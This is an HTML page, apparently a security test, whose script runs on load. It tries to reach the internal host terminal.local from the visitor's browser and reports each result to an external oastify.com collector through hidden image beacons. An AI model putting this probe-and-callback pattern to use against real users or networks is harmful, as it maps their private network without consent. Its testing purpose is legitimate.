<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="no-referrer">
  <title>Reading sample connectivity check</title>
</head>
<body>
  <h1>Reading sample connectivity check</h1>
  <p id="result">Running bounded connectivity check.</p>
  <script>
    const testCase = new URL(location.href).searchParams.get('case') || 'unspecified';
    const collector = 'https://a0b3b9aarmzz7n4tuacx2raqzh5atjbkmyo8e77xw.oastify.com';
    function signal(category) {
      const image = new Image();
      image.referrerPolicy = 'no-referrer';
      image.width = 1;
      image.height = 1;
      image.alt = '';
      image.src = `${collector}/localcheck-${encodeURIComponent(testCase)}-${category}.gif`;
      document.body.appendChild(image);
    }
    function finish(category) {
      document.querySelector('#result').textContent = `Result: ${category}`;
      signal(category);
    }
    async function run() {
      signal('start');
      try {
        const control = await fetch('./probe.html', {
          credentials: 'omit',
          cache: 'no-store',
          referrerPolicy: 'no-referrer'
        });
        if (!control.ok) {
          finish('control-failed');
          return;
        }
      } catch {
        finish('control-failed');
        return;
      }
      signal('control-ok');
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 3000);
      try {
        const response = await fetch('http://terminal.local/', {
          mode: 'cors',
          credentials: 'omit',
          redirect: 'error',
          referrerPolicy: 'no-referrer',
          signal: controller.signal
        });
        finish(response.type === 'cors' ? 'cors-readable' : 'resolved-other');
      } catch (error) {
        finish(error && error.name === 'AbortError' ? 'timeout' : 'fetch-rejected');
      } finally {
        clearTimeout(timer);
      }
    }
    run();
  </script>
</body>
</html>
